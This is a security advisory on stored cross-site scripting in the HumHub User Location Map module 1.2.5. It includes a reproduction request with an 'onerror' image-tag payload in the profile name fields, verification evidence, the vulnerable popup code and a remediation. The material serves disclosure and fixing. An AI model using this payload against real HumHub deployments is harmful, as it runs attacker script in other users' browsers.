# HumHub UserMap popup stored XSS

## Summary

HumHub User Location Map 1.2.5 contains stored cross-site scripting in map popups. User profile display names are serialized into the page and concatenated into a Leaflet bindPopup HTML string without HTML encoding. An authenticated user can store a crafted name that becomes executable markup when another user opens the map popup.

## Affected product

- Vendor/project: **KeudellCoding**
- Product: **HumHub User Location Map module**
- Affected version: **1.2.5**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (5.4)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan (钟广源), Fudan University**

## Attack prerequisites and impact

Authenticated attacker with a mappable profile location; victim opens the user map popup.

Verified flow: `profile displayName → json_encode(user_data) → Leaflet bindPopup HTML → innerHTML`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Store an HTML marker in the attacker's profile name and set valid map coordinates.
2. Open the user map as another user.
3. Click the attacker's marker and inspect the Leaflet popup DOM.

Sanitized request shape used during verification:

```http
# Authenticated attacker with a location that resolves to coordinates
POST <BASE_URL>/user/account/edit
Cookie: <ATTACKER_SESSION_COOKIE>
Content-Type: application/x-www-form-urlencoded

_csrf=<CSRF>
Profile[firstname]=<img id=gt481023h2ta
Profile[lastname]=src=x onerror=self.x=2>
Profile[zip]=10001
Profile[city]=<VALID_TEST_LOCATION>
save=Save profile

# Victim opens the map and selects the attacker marker
GET <BASE_URL>/usermap/map
Cookie: <VICTIM_SESSION_COOKIE>
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.

## Fresh verification evidence

| Run | Marker | Observation | Result |
| --- | --- | --- | --- |
| 1 | `gt481023h2sa` | DB raw; response ×6 | **PASS** |
| 2 | `gt481023h2ua` | DB raw; response ×6 | **PASS** |
| 3 | `gt481023h2ta` | DB raw; response ×6 | **PASS** |

```text
Saved database value, run 3:
<img id=gt481023h2ta src=x onerror=self.x=2>

Saved /usermap/map serialization, run 3:
"displayname":"<img id=gt481023h2ta src=x onerror=self.x=2>"
"coords":{"latitude":52.52,"longitude":13.405}

The same unencoded displayName reaches the Leaflet popup HTML string.
```

The evidence was generated from a researcher-controlled test deployment. Test records were cleaned after verification.

## Confirmed source and Sink

```text
mapView.php:42-47
var allUsers = <?= json_encode($user_data); ?>;
$.each(allUsers, function(i, user) {
    var marker = L.marker([user.coords.latitude, user.coords.longitude]);
    marker.bindPopup('<a href="' + user.profileurl + '"><b>' +
        user.displayname + '</b></a><br/>' + user.formatedaddress + '<br/>');
});
```

Root cause: JSON serialization preserves the attacker-controlled name, and client code concatenates it into a Leaflet HTML popup rather than inserting it as text.

## Recommended remediation

Create popup nodes with textContent, or HTML-encode displayname and formattedaddress before passing a string to bindPopup.

## References

- Official source: https://github.com/KeudellCoding/HumHub-Modules-UserMap/blob/master/widgets/views/mapView.php

## Evidence images

The three public evidence images show, in order:

1. The sanitized reproduction request, endpoint, parameter and payload structure.
2. The three consecutive successful verification runs and exact response/DOM/database excerpts.
3. The highlighted attacker-controlled source and unsafe rendering Sink.

The images are public-safe renderings produced from saved raw HTTP/DOM/database evidence; they are not represented as live browser screenshots.

### Sanitized reproduction

![CAN-15 sanitized reproduction](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-15/01-reproduction.png)

### Three-run success proof

![CAN-15 three-run success proof](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-15/02-success-proof.png)

### Source-to-Sink evidence

![CAN-15 source-to-Sink evidence](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-15/03-source-sink.png)
